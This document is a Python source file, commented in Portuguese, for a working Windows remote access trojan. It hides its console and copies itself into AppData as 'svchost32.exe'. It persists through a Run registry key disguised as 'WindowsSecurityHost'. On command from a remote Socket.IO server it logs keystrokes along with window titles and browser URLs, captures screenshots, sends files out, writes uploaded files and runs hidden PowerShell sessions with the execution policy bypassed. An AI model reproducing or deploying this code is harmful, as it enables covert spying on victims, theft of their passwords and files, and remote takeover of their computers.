#!/usr/bin/env python3
import socketio
import socket
import base64
import io
import os
import sys
import platform
import uuid
import time
import threading
import subprocess
import psutil
import configparser
from PIL import Image, ImageGrab
from pynput import keyboard

# Redireciona saída quando rodando como exe (sem console)
if getattr(sys, 'frozen', False):
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.devnull, 'w')

# --- Config: env var > config.ini embutido/ao lado do exe > padrão ---
if getattr(sys, 'frozen', False):
    _BASE = sys._MEIPASS  # pasta temporária com arquivos embutidos
else:
    _BASE = os.path.dirname(os.path.abspath(__file__))

_cfg = configparser.ConfigParser()
_cfg.read(os.path.join(_BASE, 'config.ini'))

SERVER_URL = (
    os.environ.get('MONITOR_SERVER') or
    _cfg.get('agent', 'server', fallback='http://localhost:3000')
)


_INSTALL_DIR  = os.path.join(os.environ.get('APPDATA',''), 'Microsoft', 'WindowsHost')
_INSTALL_NAME = 'svchost32.exe'
_INSTALL_PATH = os.path.join(_INSTALL_DIR, _INSTALL_NAME)


def relocate_and_restart():
    """Se não estiver rodando do diretório de instalação, copia para lá e relança."""
    if not getattr(sys, 'frozen', False):
        return False
    if os.path.abspath(sys.executable).lower() == os.path.abspath(_INSTALL_PATH).lower():
        return False
    try:
        import shutil
        os.makedirs(_INSTALL_DIR, exist_ok=True)
        shutil.copy2(sys.executable, _INSTALL_PATH)
        subprocess.Popen(
            [_INSTALL_PATH],
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
            close_fds=True
        )
        return True
    except Exception:
        return False


def add_to_startup():
    """Registra o exe no startup do Windows (roda ao ligar o PC)."""
    if not getattr(sys, 'frozen', False):
        return
    try:
        import winreg
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r'Software\Microsoft\Windows\CurrentVersion\Run',
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, 'WindowsSecurityHost', 0, winreg.REG_SZ, _INSTALL_PATH)
        winreg.CloseKey(key)
    except Exception:
        pass
CLIENT_ID = str(uuid.getnode())  # Machine MAC as ID
HOSTNAME = platform.node()
OS_INFO = f"{platform.system()} {platform.release()}"

# --- State ---
keylog_active = False
key_listener = None
sio = socketio.Client()


def get_active_window():
    """Get the currently active window title (fast path)."""
    try:
        if platform.system() == 'Windows':
            import win32gui
            hwnd = win32gui.GetForegroundWindow()
            title = win32gui.GetWindowText(hwnd)
            return title
    except Exception:
        pass
    return ''


# --- Browser URL (cached, polled separately) ---
_browser_url_cache = {}
_browser_cache_lock = threading.Lock()
_last_browser_pid = None


def get_browser_url_by_pid(pid):
    """Get browser URL for a given process PID (expensive, called separately)."""
    try:
        import win32process
        browser_names = {'chrome.exe', 'msedge.exe', 'firefox.exe', 'brave.exe',
                         'iexplore.exe', 'opera.exe', 'vivaldi.exe'}
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['pid'] == pid and proc.info['name'] in browser_names:
                import subprocess
                result = subprocess.run(
                    ['powershell', '-Command',
                     '$wshell = New-Object -ComObject shell.application; '
                     '$wshell.Windows() | ForEach-Object { $_.LocationURL }'],
                    capture_output=True, text=True, timeout=3
                )
                urls = result.stdout.strip().split('\n')
                if urls:
                    return urls[-1].strip()
    except Exception:
        pass
    return ''


def url_poller():
    """Background thread: polls browser URL every 3s (only when keylog active)."""
    global _last_browser_pid
    import win32gui
    import win32process

    while True:
        if not keylog_active:
            time.sleep(1)
            continue

        try:
            hwnd = win32gui.GetForegroundWindow()
            _, pid = win32process.GetWindowThreadProcessId(hwnd)

            if pid != _last_browser_pid:
                _last_browser_pid = pid
                url = get_browser_url_by_pid(pid)
                if url:
                    with _browser_cache_lock:
                        _browser_url_cache[pid] = url
        except Exception:
            pass

        time.sleep(3)


def get_cached_url(pid):
    with _browser_cache_lock:
        return _browser_url_cache.get(pid, '')


def start_url_poller():
    """Start background URL polling thread."""
    t = threading.Thread(target=url_poller, daemon=True)
    t.start()


SCREEN_QUALITY = int(os.environ.get('SCREEN_QUALITY', '88'))  # 1-95
SCREEN_SCALE   = float(os.environ.get('SCREEN_SCALE', '1.0'))  # 1.0 = resolução nativa


def get_screen_capture():
    """Take a screenshot and return as base64 JPEG."""
    try:
        img = ImageGrab.grab(all_screens=True)
        if SCREEN_SCALE != 1.0:
            w = int(img.width * SCREEN_SCALE)
            h = int(img.height * SCREEN_SCALE)
            img = img.resize((w, h), Image.LANCZOS)
        buf = io.BytesIO()
        img.save(buf, format='JPEG', quality=SCREEN_QUALITY, optimize=True)
        return base64.b64encode(buf.getvalue()).decode()
    except Exception as e:
        print(f"Screen capture error: {e}")
        return None


# --- Keylogger (buffered per window, lightweight) ---
key_buffer = []
last_window_title = ''
last_window_pid = 0
key_buffer_lock = threading.Lock()
flush_timer = None
_cached_url = ''
_cached_url_lock = threading.Lock()


def flush_keylog_buffer():
    """Send buffered keys grouped by window."""
    global key_buffer, last_window_title, flush_timer
    with key_buffer_lock:
        if not key_buffer:
            return
        buffer_copy = list(key_buffer)
        key_buffer.clear()

    title = last_window_title
    with _cached_url_lock:
        url = _cached_url
    text = ''.join(buffer_copy)

    print(f"Keylog [{title}]: {text!r}")
    sio.emit('agent:keylog', {
        'clientId': CLIENT_ID,
        'text': text,
        'windowTitle': title,
        'windowUrl': url,
        'timestamp': int(time.time())
    })


def schedule_flush():
    """Flush buffer after 5 seconds of inactivity."""
    global flush_timer
    with key_buffer_lock:
        if flush_timer:
            flush_timer.cancel()
        flush_timer = threading.Timer(5.0, flush_keylog_buffer)
        flush_timer.daemon = True
        flush_timer.start()


def update_browser_url():
    """Background: update cached URL every 3s. Cheap PID check."""
    global _cached_url, _last_browser_pid
    import win32gui
    import win32process

    while True:
        if not keylog_active:
            time.sleep(1)
            continue

        try:
            hwnd = win32gui.GetForegroundWindow()
            _, pid = win32process.GetWindowThreadProcessId(hwnd)

            # Only re-fetch if window changed
            if pid != _last_browser_pid:
                _last_browser_pid = pid
                url = get_browser_url_by_pid(pid)
                if url:
                    with _cached_url_lock:
                        _cached_url = url
        except Exception:
            pass

        time.sleep(3)


class KeyLogger:
    def on_press(self, key):
        global last_window_title, last_window_pid
        try:
            k = key.char
        except AttributeError:
            k = f'[{str(key).replace("Key.", "")}]'

        # Only get title — very fast (no subprocess, no process iteration)
        title = get_active_window()

        # Window changed — flush old buffer
        if title != last_window_title:
            flush_keylog_buffer()
            last_window_title = title or '(sem título)'

        with key_buffer_lock:
            key_buffer.append(k)

        schedule_flush()

    def on_release(self, key):
        return keylog_active


def start_keylogger():
    global keylog_active, key_listener, last_window_title
    keylog_active = True
    last_window_title = get_active_window() or '(sem título)'
    key_listener = keyboard.Listener(
        on_press=KeyLogger().on_press,
        on_release=KeyLogger().on_release
    )
    key_listener.start()
    # Start background URL poller (only one thread)
    threading.Thread(target=update_browser_url, daemon=True).start()


def stop_keylogger():
    global keylog_active, key_listener
    keylog_active = False
    flush_keylog_buffer()
    if key_listener:
        key_listener.stop()
        key_listener = None


# --- File Operations ---
def list_files(path):
    """List files and directories."""
    try:
        entries = os.listdir(path)
        files = []
        for entry in entries:
            full = os.path.join(path, entry)
            files.append({
                'name': entry,
                'isDir': os.path.isdir(full),
                'size': os.path.getsize(full) if os.path.isfile(full) else 0,
                'modified': os.path.getmtime(full)
            })
        return sorted(files, key=lambda x: (not x['isDir'], x['name'].lower()))
    except PermissionError:
        return []


def download_file(file_path, request_id):
    """Read file in chunks and send to server."""
    chunk_size = 64 * 1024  # 64KB
    try:
        with open(file_path, 'rb') as f:
            while True:
                chunk = f.read(chunk_size)
                if not chunk:
                    sio.emit('agent:file:chunk', {
                        'clientId': CLIENT_ID,
                        'requestId': request_id,
                        'data': '',
                        'done': True,
                        'fileName': os.path.basename(file_path)
                    })
                    break
                sio.emit('agent:file:chunk', {
                    'clientId': CLIENT_ID,
                    'requestId': request_id,
                    'data': base64.b64encode(chunk).decode(),
                    'done': False,
                    'fileName': os.path.basename(file_path)
                })
    except Exception as e:
        print(f"Download error: {e}")
        sio.emit('agent:file:chunk', {
            'clientId': CLIENT_ID,
            'requestId': request_id,
            'data': '',
            'done': True,
            'fileName': f"ERROR: {str(e)}"
        })


def upload_file(file_path, data_b64, request_id, is_final):
    """Write uploaded file chunk."""
    mode = 'ab' if not is_final else 'wb'
    try:
        with open(file_path, 'wb') as f:
            f.write(base64.b64decode(data_b64))
        sio.emit('agent:upload:done', {
            'clientId': CLIENT_ID,
            'requestId': request_id,
            'success': True
        })
    except Exception as e:
        sio.emit('agent:upload:done', {
            'clientId': CLIENT_ID,
            'requestId': request_id,
            'success': False
        })


# --- Socket.IO Events ---
@sio.event
def connect():
    print(f"Connected to {SERVER_URL}")
    sio.emit('agent:register', {
        'clientId': CLIENT_ID,
        'hostname': HOSTNAME,
        'os': OS_INFO,
        'ip': socket.gethostbyname(socket.gethostname())
    })
    # Start periodic heartbeat
    threading.Thread(target=heartbeat_loop, daemon=True).start()


@sio.event
def disconnect():
    print("Disconnected from server")


def heartbeat_loop():
    while True:
        time.sleep(30)
        sio.emit('agent:heartbeat', {'clientId': CLIENT_ID})


# --- PowerShell sessions: sessionId -> process ---
ps_sessions = {}
ps_sessions_lock = threading.Lock()


def create_ps_session(session_id):
    """Start a persistent PowerShell process."""
    # UTF-8 output, sem prompt colorido, sem confirmações interativas
    startup = subprocess.STARTUPINFO()
    startup.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startup.wShowWindow = 0  # oculta janela

    proc = subprocess.Popen(
        [
            'powershell.exe',
            '-NoLogo',
            '-NoProfile',
            '-NonInteractive',
            '-ExecutionPolicy', 'Bypass',
            '-Command', '-'
        ],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        encoding='utf-8',
        errors='replace',
        startupinfo=startup,
        creationflags=subprocess.CREATE_NO_WINDOW
    )

    with ps_sessions_lock:
        ps_sessions[session_id] = proc

    def read_stream(stream, is_err=False):
        try:
            for line in stream:
                if line:
                    sio.emit('agent:ps:output', {
                        'clientId': CLIENT_ID,
                        'sessionId': session_id,
                        'output': line,
                        'isErr': is_err
                    })
        except Exception:
            pass

    # Threads separadas para stdout e stderr
    threading.Thread(target=read_stream, args=(proc.stdout, False), daemon=True).start()
    threading.Thread(target=read_stream, args=(proc.stderr, True),  daemon=True).start()

    # Thread monitora fim do processo
    def watch_exit():
        proc.wait()
        with ps_sessions_lock:
            ps_sessions.pop(session_id, None)
        sio.emit('agent:ps:output', {
            'clientId': CLIENT_ID,
            'sessionId': session_id,
            'output': '\n[Sessão encerrada]\n',
            'isErr': False
        })
    threading.Thread(target=watch_exit, daemon=True).start()

    return proc


def run_ps_command(session_id, command):
    """Executa um comando no processo PowerShell persistente."""
    with ps_sessions_lock:
        proc = ps_sessions.get(session_id)

    if proc is None or proc.poll() is not None:
        proc = create_ps_session(session_id)
        sio.emit('agent:ps:output', {
            'clientId': CLIENT_ID,
            'sessionId': session_id,
            'output': '[Nova sessão iniciada]\n',
            'isErr': False
        })

    try:
        wrapped = (
            f"try {{ {command} }} catch {{ Write-Error $_.Exception.Message }}\n"
            f'Write-Host "##PROMPT##$($PWD.Path)##"\n'
        )
        proc.stdin.write(wrapped)
        proc.stdin.flush()
    except Exception as e:
        sio.emit('agent:ps:output', {
            'clientId': CLIENT_ID,
            'sessionId': session_id,
            'output': f'[Erro ao enviar comando: {e}]\n',
            'isErr': True
        })


@sio.on('cmd:ps:open')
def on_ps_open(data):
    session_id = data.get('sessionId', 'default')
    with ps_sessions_lock:
        already = session_id in ps_sessions
    if not already:
        create_ps_session(session_id)
    print(f"PowerShell session opened: {session_id}")


@sio.on('cmd:ps:input')
def on_ps_input(data):
    session_id = data.get('sessionId', 'default')
    command = data.get('command', '')
    run_ps_command(session_id, command)


@sio.on('cmd:ps:close')
def on_ps_close(data):
    session_id = data.get('sessionId', 'default')
    with ps_sessions_lock:
        proc = ps_sessions.pop(session_id, None)
    if proc:
        proc.terminate()
    print(f"PowerShell session closed: {session_id}")


@sio.on('cmd:ps:complete')
def on_ps_complete(data):
    session_id  = data.get('sessionId', 'default')
    input_text  = data.get('input', '')
    cursor_pos  = data.get('cursor', len(input_text))
    request_id  = data.get('requestId', '')
    cwd         = data.get('cwd') or None

    try:
        escaped = input_text.replace("'", "''")
        ps_script = (
            f"$c=[System.Management.Automation.CommandCompletion]"
            f"::CompleteInput('{escaped}',{cursor_pos},$null);"
            f"$c.CompletionMatches|ForEach-Object{{$_.CompletionText}}"
        )
        encoded = base64.b64encode(ps_script.encode('utf-16-le')).decode()
        result = subprocess.run(
            ['powershell.exe', '-NoProfile', '-NonInteractive',
             '-EncodedCommand', encoded],
            capture_output=True, text=True, timeout=5,
            creationflags=subprocess.CREATE_NO_WINDOW,
            cwd=cwd if (cwd and os.path.isdir(cwd)) else None
        )
        completions = [
            line.strip()
            for line in result.stdout.strip().split('\n')
            if line.strip()
        ]
    except Exception as e:
        print(f"Completion error: {e}")
        completions = []

    sio.emit('agent:ps:complete', {
        'clientId':    CLIENT_ID,
        'sessionId':   session_id,
        'requestId':   request_id,
        'completions': completions
    })


@sio.on('cmd:screen')
def on_request_screen(data):
    screenshot = get_screen_capture()
    if screenshot:
        sio.emit('agent:screen', {'clientId': CLIENT_ID, 'screenshot': screenshot})


@sio.on('cmd:keylog:stream')
def on_start_keylog(data):
    start_keylogger()
    print("Keylogger started")


@sio.on('cmd:keylog:stop')
def on_stop_keylog(data):
    stop_keylogger()
    print("Keylogger stopped")


@sio.on('cmd:files')
def on_list_files(data):
    path = data.get('path', '.')
    files = list_files(path)
    sio.emit('agent:files', {
        'clientId': CLIENT_ID,
        'requestId': data.get('requestId', ''),
        'files': files,
        'path': path
    })


@sio.on('cmd:download')
def on_download(data):
    file_path = data.get('path', '')
    request_id = data.get('requestId', '')
    threading.Thread(target=download_file, args=(file_path, request_id), daemon=True).start()


@sio.on('cmd:upload')
def on_upload(data):
    file_path = data.get('path', '')
    data_b64 = data.get('data', '')
    request_id = data.get('requestId', '')
    threading.Thread(target=upload_file, args=(file_path, data_b64, request_id, True), daemon=True).start()


def main():
    if relocate_and_restart():
        sys.exit(0)
    add_to_startup()

    try:
        sio.connect(SERVER_URL)
        sio.wait()
    except Exception as e:
        print(f"Connection failed: {e}")
        print("Retrying in 5 seconds...")
        time.sleep(5)
        main()


if __name__ == '__main__':
    main()
